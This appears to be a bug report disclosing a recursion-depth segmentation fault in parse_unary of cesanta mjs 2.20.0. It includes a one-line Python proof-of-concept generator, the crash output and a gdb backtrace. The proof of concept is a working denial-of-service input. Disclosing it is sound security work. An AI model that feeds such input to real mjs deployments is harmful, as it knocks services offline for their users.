**The name of an affected Product**

[mjs](https://github.com/cesanta/mjs)

**The affected version**

Commit: [b1b6eac](https://github.com/cesanta/mjs/commit/b1b6eac6b1e5b830a5cb14f8f4dc690ef3162551) (Tag: [2.20.0](https://github.com/cesanta/mjs/releases/tag/2.20.0))

**Description**

An issue in cesanta mjs 2.20.0 allows a remote attacker to cause a denial of service via the parse_unary function in the mjs_parser.c file.

**Vulnerability Type**

Segmentation fault

**Environment**

- Operating System

```
Debian GNU/Linux 12
```

- Steps to Reproduce

```
git clone https://github.com/cesanta/mjs
cd mjs
make
```

- poc

```
sysirq@debian:~/Work/analyse/mjs/build$ cat generate_poc.py 
#!/bin/python3

print("let i = ","!"*1024000,"1",";")
sysirq@debian:~/Work/analyse/mjs/build$ ./generate_poc.py > poc.js
sysirq@debian:~/Work/analyse/mjs/build$ ./mjs poc.js 
Segmentation fault
sysirq@debian:~/Work/analyse/mjs/build$ 
```

**gdb info**

```
sysirq@debian:~/Work/analyse/mjs/build$ gdb mjs 
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from mjs...
(gdb) set args poc.js 
(gdb) r
Starting program: /home/sysirq/Work/analyse/mjs/build/mjs test.js 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
cs_log_print_prefix (level=LL_VERBOSE_DEBUG, file=0x427d44 "src/mjs_tok.c", ln=250) at src/common/cs_dbg.c:61
61	  size_t fl = 0, ll = 0, pl = 0;
(gdb) bt
#0  cs_log_print_prefix (level=LL_VERBOSE_DEBUG, file=0x427d44 "src/mjs_tok.c", ln=250) at src/common/cs_dbg.c:61
#1  0x0000000000419764 in pnext (p=0x7fffffffe058) at src/mjs_tok.c:250
#2  0x0000000000415c24 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:399
#3  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#4  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#5  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#6  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#7  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#8  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#9  0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#10 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#11 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#12 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#13 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#14 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#15 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#16 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#17 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#18 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#19 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#20 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#21 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#22 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#23 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#24 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#25 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#26 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#27 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#28 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
#29 0x0000000000415c57 in parse_unary (p=0x7fffffffe058, prev_op=0) at src/mjs_parser.c:402
```
